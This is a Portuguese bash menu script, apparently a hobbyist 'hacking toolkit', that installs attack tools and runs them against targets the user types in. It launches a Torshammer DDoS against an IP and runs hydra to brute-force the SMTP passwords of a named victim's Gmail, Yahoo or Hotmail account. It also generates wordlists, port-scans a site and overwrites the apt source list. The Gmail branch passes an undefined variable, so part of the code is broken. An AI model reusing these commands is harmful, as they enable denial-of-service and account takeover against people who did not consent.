#!/bin/bash 
preto="\033[0;30m"
vermelho="\033[0;31m"
verde="\033[0;32m"
marrom="\033[0;33m"
azul="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
cinzaClaro="\033[0;37m"
pretoCinza="\033[1;30m"
vermelhoClaro="\033[1;31m"
verdeClaro="\033[1;32m"
amarelo="\033[1;33m"
azulClaro="\033[1;34m"
purpleClaro="\033[1;35m"
cyanClaro="\033[1;36m"

clear
echo "$verde
               SHELL SCRIPT CODED BY:  LUCIFER and Doff \n\n";
      figlet TioLuciffer
       
                                                                      




echo "$cyan   

      -----  ----  ---MENU v2--- --- --- 
       \n\n";
echo "$cyanClaro
----------------------------------------
|    1 --> ATUALIZAR SOURCE.LIST       |
----------------------------------------
|    2 --> INSTALAR PACOTES            |
----------------------------------------
|    3 --> GERAR WORDLIST              |
----------------------------------------
|    4 --> SCANEAR PORTAS              |
----------------------------------------   
|    5 --> INSTALAR DDOS               |
----------------------------------------
|    6 --> MINHAS REDES ANTI-SOCIAIS   | 
----------------------------------------
|    7 --> DDOS                        |
----------------------------------------
|    8 --> HYDRA
----------------------------------------
|    9 --> ENCRYPT MD5                 |
----------------------------------------                    |    10 --> SAIR                       |
----------------------------------------";
echo "$verde [+] Select Option;
> \n\n"; 
read at
 if [ "$at" = "2" ]
		then
clear 
echo "$vermelho  BAIXANDO PACOTES [Aguarde...] \n\n";

apt-get install python 
apt-get install python3
apt-get install vim 
apt-get install nano
apt-get install git
apt-get install perl
apt-get install python-requests
apt-get install libany-uri-escape-perl 
apt-get install libhtml-html5-entities-perl
apt-get install libhtml-entities-numbered-perl  
apt-get install libhtml-parser-perl  
apt-get install libwww-perl
apt-get install nmap
apt-get install hydra
apt-get install crunch
echo "$verde Concluido! \n\n";
sleep 0.1
cd && sh Lulzsec.sh 

fi

if [ "$at" = "1" ]
		then
clear 
			echo "\033[1;31mAtualizando Source  [Aguarde...]\033[1;33m"

			sleep 0.5

			cd  /sdcard/GNURoot/home
			rm sources.list
			rm sources.velhas.list
			apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6
			cd /etc/apt
			rm sources.list 
			echo "deb http://repo.kali.org/kali kali-bleeding-edge main" >> sources.list
 			echo "deb-src http://repo.kali.org/kali kali-bleeding-edge main" >> sources.list
			echo "deb http://ftp.br.debian.org/debian/ jessie main non-free contrib" >> sources.list
			echo "deb-src http://ftp.br.debian.org/debian/ jessie main non-free contrib" >> sources.list
			echo "deb http://ftp.br.debian.org/debian/ jessie-updates main non-free contrib" >> sources.list
			echo "deb-src http://ftp.br.debian.org/debian/ jessie-updates main non-free contrib" >> sources.list
			echo "deb http://ftp.br.debian.org/debian/ jessie-backports main non-free contrib" >> sources.list
			echo "deb-src http://ftp.br.debian.org/debian/ jessie-backports main non-free contrib" >> sources.list
			echo "deb http://security.debian.org/ jessie/updates main contrib non-free" >> sources.list
			echo "deb-src http://security.debian.org/ jessie/updates main contrib non-free" >> sources.list
			echo "deb http://ftp.debian.org/debian jessie-proposed-updates main contrib non-free" >>sources.list
			apt-get update 
            apt-get upgrade -y
			echo "$verde Concluido com Sucesso !
     retornando  ao menu \n\n";
sleep 2
cd ; sh lucifer.sh 
fi
if [ "$at" = "5" ]
then
clear
sleep 0.5
echo "$vermelho
   INSTALANDO......."
sleep 0.1

apt-get install git
cd ;
git clone https://github.com/dotfighter/torshammer.git

echo "$azul

   INSTALADO COM SUCESSO !"
sleep 0.5
cd ; sh lucifer.sh
fi
if [ "$at" = "6" ]
then
echo "$cyan TWITTER: @TioLuciferOfc
      $azul FACEBOOK: Caio Luci
      $vermelho YOUTUBE: https://www.youtube.com/channel/UCN-RjexsRSrNG9QZZ0iQrww
      $verde WHATSAPP: +1 (267) 490-3051"
sleep 10.0
cd ; sh lucifer.sh      
fi
if [ "$at" = "4" ]
then
echo  "$azulClaro \n\n Digite o Site" 
read Site
nmap $Site
sleep 10.0
cd ; sh lucifer.sh
fi 
if [ "$at" = "7" ]
then
cd ; cd torshammer
echo "Voce so tem 10 segundos para digitar o IP"
echo "Digite o IP
>> \n\n"
sleep 7.5
read IP
python torshammer.py -t $IP -r 256
fi
if  [ "$at" = "3" ]
then
apt-get install crunch
echo "$azulClaro Digite a quantidade de caracteres\n\n"
read caracteres
sleep 5.0
echo "$azulClaro Digite as letras de sua Wordlist"
sleep 5.0
read letras
crunch 1 $caracteres $letras -o wordlist.txt
cd ; sh lucifer.sh
fi
if [ "$at" = "9" ]
then
echo -n "$Branco Senha para Encryptar    "
read senha
echo " "

echo "CODANDO SENHA...[Aguarde...]"
echo " "
echo -n "$senha " 
echo -n "$senha " | md5sum | cut -d " " -f 1
tail -n 1
sleep 5.0
cd ; sh lucifer.sh 
fi
if [ "$at" = "10" ]
then
exit
fi
if  [ "$at" = "8" ]
then
echo "$azul \n\nVocê deseja fazer Bruteforce em que Servidor"
echo "\n\nGMAIL - 1
      \n\nYAHOO - 2
      \n\nHOTMAIL - 3"
read se 
fi 
if  [ "$se" = "1" ]
then
apt-get install hydra
echo "$azulClaro \n\nDigite o mail da vítima"
read mail
echo "$azulClaro \n\nDigite o local da wordlist"
read word
hydra smtp.gmail.com smtp -l $user -P $word -s 465 -vV
fi
if [ "$se" = "2" ]
then
echo "$azulClaro \n\nDigite mail da vítima"
read mail
echo "$azulClaro \n\nDigite o local da wordlist"
read word
hydra smtp.mail.yahoo.com smtp -l $mail -P $word -s 465 -vV
fi
if [ "$se" = "3" ]
then 
echo "$azulClaro \n\nDigite o mail da vítima"
read mail
echo "$azulClaro \n\nDigite o local da wordlist"
read word
hydra smtp.live.com smtp -l $mail -P $word -s 465 -vV 
fi